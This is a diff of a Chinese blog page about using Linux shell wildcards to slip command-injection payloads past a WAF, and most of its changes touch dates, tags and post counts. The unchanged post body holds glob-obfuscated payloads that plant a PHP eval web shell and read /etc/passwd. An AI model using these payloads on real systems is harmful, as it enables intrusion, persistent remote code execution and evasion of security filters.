@@ -105,7 +105,7 @@
 <meta property="og:description" content="最近发现了一个技巧，在命令执行漏洞时，会非常有用，就是Linux 的通配符。我们常用通配符去搜索、查找、匹配文件内容，但linux shell有glob模式，其可以使用通配符去匹配命令 1234567891011121314151617181920字符	解释*	匹配任意长度任意字符?	匹配任意单个字符[list]	匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合[^list]	匹">
 <meta property="og:locale" content="en">
 <meta property="og:image" content="http://yoursite.com/blog/linux-wildcard/ifconfig-wildcard.png">
-<meta property="og:updated_time" content="2018-07-22T11:41:52.000Z">
+<meta property="og:updated_time" content="2021-08-24T13:36:48.285Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux 通配符 绕过WAF">
 <meta name="twitter:description" content="最近发现了一个技巧，在命令执行漏洞时，会非常有用，就是Linux 的通配符。我们常用通配符去搜索、查找、匹配文件内容，但linux shell有glob模式，其可以使用通配符去匹配命令 1234567891011121314151617181920字符	解释*	匹配任意长度任意字符?	匹配任意单个字符[list]	匹配指定范围内(list)任意单个字符，也可以是单个字符组成的集合[^list]	匹">
@@ -385,8 +385,8 @@
               
                 <span class="post-meta-item-text">Post modified</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2018-07-22T19:41:52+08:00">
-                2018-07-22
+              <time title="Post modified" itemprop="dateModified" datetime="2021-08-24T21:36:48+08:00">
+                2021-08-24
               </time>
             
           </span>
@@ -406,17 +406,6 @@
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                   <a href="/categories/Linux/" itemprop="url" rel="index">
                     <span itemprop="name">Linux</span>
-                  </a>
-                </span>
-
-                
-                
-                  , 
-                
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Linux/tricks/" itemprop="url" rel="index">
-                    <span itemprop="name">tricks</span>
                   </a>
                 </span>
 
@@ -461,6 +450,7 @@
 <img src="/blog/linux-wildcard/ifconfig-wildcard.png" alt="ifconfig-wildcard" title="ifconfig-wildcard">
 <p>知道了这个原理，我们可以将我们以后所有的payload都进行改造:</p>
 <figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">[webshell]</div><div class="line">http://a.com?<span class="keyword">cmd</span><span class="bash">=/???/e??? <span class="string">"&lt;?php eval(<span class="variable">$_POST</span>['cmd'])?&gt;"</span> &gt; 1.php</span></div><div class="line"></div><div class="line">[读取passwd内容]</div><div class="line"><span class="keyword">cmd</span><span class="bash">=/???/ca? /???/p?????</span></div><div class="line"></div><div class="line">其余的可自行修改</div></pre></td></tr></table></figure>
+
       
     </div>
     
@@ -496,8 +486,6 @@
         <div class="post-tags">
           
             <a href="/tags/Linux/" rel="tag"><i class="fa fa-tag"></i> Linux</a>
-          
-            <a href="/tags/wildcard/" rel="tag"><i class="fa fa-tag"></i> wildcard</a>
           
             <a href="/tags/bypass/" rel="tag"><i class="fa fa-tag"></i> bypass</a>
           
@@ -608,7 +596,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/">
-                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-count">57</span>
                 <span class="site-state-item-name">posts</span>
               </a>
             </div>
@@ -619,7 +607,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">34</span>
+                <span class="site-state-item-count">17</span>
                 <span class="site-state-item-name">categories</span>
               </a>
             </div>
@@ -630,7 +618,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-count">69</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
